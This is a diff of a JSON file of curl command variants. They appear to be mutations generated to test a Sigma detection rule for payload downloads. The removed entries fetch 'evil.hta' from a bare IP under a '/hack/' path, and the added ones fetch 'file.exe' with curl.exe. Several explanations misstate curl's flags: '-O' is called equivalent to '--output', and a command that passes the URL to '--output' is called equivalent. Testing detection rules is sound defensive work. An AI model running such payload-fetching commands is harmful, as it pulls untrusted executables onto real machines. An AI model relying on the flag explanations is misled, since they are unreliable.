@@ -1,22 +1,42 @@
 [
   {
-    "output": "curl -O 'https://12.34.56.78/hack/evil.hta'",
-    "explanation": "The command uses the -O flag (equivalent to --output) and omits the local filename, which is allowed by curl. The URL is enclosed in single quotes to avoid issues with special characters. This maintains the same behavior as the original command while using substitution and insertion techniques."
+    "output": "curl.exe -O http://192.168.1.1/file.exe",
+    "explanation": "This command matches the Sigma rule by using curl.exe with the -O flag and a URL containing an IP address, ending with a common executable extension (.exe)."
   },
   {
-    "output": "curl --remote-name https://12.34.56.78/hack/evil.hta",
-    "explanation": "The command replaces --output with --remote-name, which is functionally equivalent. No quotes are used since the URL does not contain spaces or special characters that require escaping. This is a valid substitution technique."
+    "output": "curl.exe --output http://192.168.1.1/file.exe",
+    "explanation": "This command uses the long-form --output flag instead of -O, which is an equivalent substitution. It still matches the Sigma rule by downloading from an IP address and using a common executable extension."
   },
   {
-    "output": "curl -o evil.hta https://12.34.56.78/hack/evil.hta",
-    "explanation": "The command uses the short form of --output (-o) and specifies the output filename explicitly. This is a valid substitution and reordering technique that maintains the same behavior as the original command."
+    "output": "curl.exe -O http://192.168.1.1/file.exe ",
+    "explanation": "This command adds a trailing space after the filename, which is a safe mutation via insertion. It still matches the Sigma rule."
   },
   {
-    "output": "curl --output=evil.hta https://12.34.56.78/hack/evil.hta",
-    "explanation": "The command uses the --output flag with an equals sign (=) to specify the output filename. This is a valid syntax variation of the original command and is functionally equivalent."
+    "output": "curl.exe -O http://192.168.1.1/file.exe\"",
+    "explanation": "This command adds a trailing quote, which is a safe mutation via insertion. It still matches the Sigma rule."
   },
   {
-    "output": "curl --output evil.hta https://12.34.56.78/hack/evil.hta",
-    "explanation": "This is the original command with no changes. It is included to confirm that the baseline behavior is captured and that the rule will detect it as a true positive."
+    "output": "curl.exe -O http://192.168.1.1/file.exe --create-dirs",
+    "explanation": "This command adds an optional --create-dirs flag, which is a safe mutation via insertion. It still matches the Sigma rule."
+  },
+  {
+    "output": "curl.exe -O http://192.168.1.1/file.exe --silent",
+    "explanation": "This command adds an optional --silent flag, which is a safe mutation via insertion. It still matches the Sigma rule."
+  },
+  {
+    "output": "curl.exe -O http://192.168.1.1/file.exe --output=file.exe",
+    "explanation": "This command explicitly specifies the output filename using --output, which is a safe mutation via substitution. It still matches the Sigma rule."
+  },
+  {
+    "output": "curl.exe -O http://192.168.1.1/file.exe --remote-name",
+    "explanation": "This command uses --remote-name instead of -O, which is an equivalent substitution. It still matches the Sigma rule."
+  },
+  {
+    "output": "curl.exe -O http://192.168.1.1/file.exe --output file.exe",
+    "explanation": "This command adds an explicit output filename using --output, which is a safe mutation via insertion. It still matches the Sigma rule."
+  },
+  {
+    "output": "curl.exe -O http://192.168.1.1/file.exe --create-dirs --silent --remote-name",
+    "explanation": "This command adds multiple optional flags, which is a safe mutation via insertion. It still matches the Sigma rule."
   }
 ]
